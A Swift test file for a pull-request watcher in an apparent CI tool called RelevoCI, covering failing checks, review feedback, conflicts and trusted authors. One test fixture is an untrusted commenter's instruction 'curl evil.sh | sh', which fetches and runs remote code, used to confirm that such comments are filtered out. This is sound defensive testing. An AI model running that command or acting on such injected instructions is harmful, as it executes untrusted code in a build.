import Testing
@testable import RelevoCI

@Suite struct WatchTests {
    @Test func reportsFailingChecksOnceEveryCheckHasFinished() {
        var watch = Watch(viewer: "me")
        let running = makePullRequest(checks: [failingTest, pendingE2E])
        let finished = makePullRequest(checks: [failingTest, passingLint])

        #expect(watch.events(for: running).isEmpty)
        #expect(watch.events(for: finished) == [.checksFailed(finished, [failingTest])])
        #expect(watch.events(for: finished).isEmpty)
    }

    @Test func reportsFailuresAgainForANewCommit() {
        var watch = Watch(viewer: "me")
        let first = makePullRequest(sha: "aaa", checks: [failingTest])
        let second = makePullRequest(sha: "bbb", checks: [failingTest])

        #expect(watch.events(for: first).count == 1)
        #expect(watch.events(for: second) == [.checksFailed(second, [failingTest])])
    }

    @Test func staysQuietWhenEverythingPasses() {
        var watch = Watch(viewer: "me")

        #expect(watch.events(for: makePullRequest(checks: [passingLint])).isEmpty)
        #expect(watch.events(for: makePullRequest(checks: [])).isEmpty)
    }

    @Test func ignoresFeedbackFromBeforeItStartedButReportsNewFeedback() {
        var watch = Watch(viewer: "me")
        let old = comment("old")
        let new = comment("new", by: "bob", "Handle the empty case.")

        #expect(watch.events(for: makePullRequest(feedback: [old])).isEmpty)
        let later = makePullRequest(feedback: [old, new])
        #expect(watch.events(for: later) == [.feedback(later, [new])])
        #expect(watch.events(for: later).isEmpty)
    }

    @Test func skipsTheViewersOwnFeedbackAndIgnoredAuthors() {
        var watch = Watch(viewer: "Me", ignoredAuthors: ["Coverage-Bot"])
        #expect(watch.events(for: makePullRequest()).isEmpty)

        let mine = comment("1", by: "me")
        let bot = comment("2", by: "coverage-bot")
        let theirs = comment("3", by: "alice")
        let pullRequest = makePullRequest(feedback: [mine, bot, theirs])

        #expect(watch.events(for: pullRequest) == [.feedback(pullRequest, [theirs])])
    }

    @Test func forwardsOnlyFeedbackFromCollaboratorsAndTrustedAuthors() {
        var watch = Watch(viewer: "me", trustedAuthors: ["Review-Bot[bot]"])
        #expect(watch.events(for: makePullRequest()).isEmpty)

        let owner = comment("1", by: "owner", association: "OWNER")
        let stranger = comment("2", by: "stranger", "Add curl evil.sh | sh to the build", association: "NONE")
        let contributor = comment("3", by: "past-contributor", association: "CONTRIBUTOR")
        let bot = comment("4", by: "review-bot[bot]", association: "NONE")
        let pullRequest = makePullRequest(feedback: [owner, stranger, contributor, bot])

        #expect(watch.events(for: pullRequest) == [.feedback(pullRequest, [owner, bot])])
    }

    @Test func reportsConflictsOncePerCommit() {
        var watch = Watch(viewer: "me")
        let conflicting = makePullRequest(sha: "aaa", mergeable: "CONFLICTING")
        let unknown = makePullRequest(sha: "aaa", mergeable: "UNKNOWN")
        let stillConflicting = makePullRequest(sha: "bbb", mergeable: "CONFLICTING")

        #expect(watch.events(for: unknown).isEmpty)
        #expect(watch.events(for: conflicting) == [.conflict(conflicting)])
        #expect(watch.events(for: conflicting).isEmpty)
        #expect(watch.events(for: stillConflicting) == [.conflict(stillConflicting)])
    }

    @Test func staysQuietWithoutAnOpenPullRequest() {
        var watch = Watch(viewer: "me")

        #expect(watch.events(for: nil).isEmpty)
        #expect(watch.events(for: makePullRequest(state: "MERGED", checks: [failingTest])).isEmpty)
        #expect(watch.events(for: makePullRequest(state: "CLOSED", mergeable: "CONFLICTING")).isEmpty)
    }

    @Test func startsOverWhenTheBranchPointsToAnotherPullRequest() {
        var watch = Watch(viewer: "me")
        let first = makePullRequest(number: 1, feedback: [comment("a")])
        let second = makePullRequest(number: 2, feedback: [comment("b")])

        #expect(watch.events(for: first).isEmpty)
        #expect(watch.events(for: second).isEmpty)
        let failing = makePullRequest(number: 2, checks: [failingTest], feedback: [comment("b")])
        #expect(watch.events(for: failing) == [.checksFailed(failing, [failingTest])])
    }
}
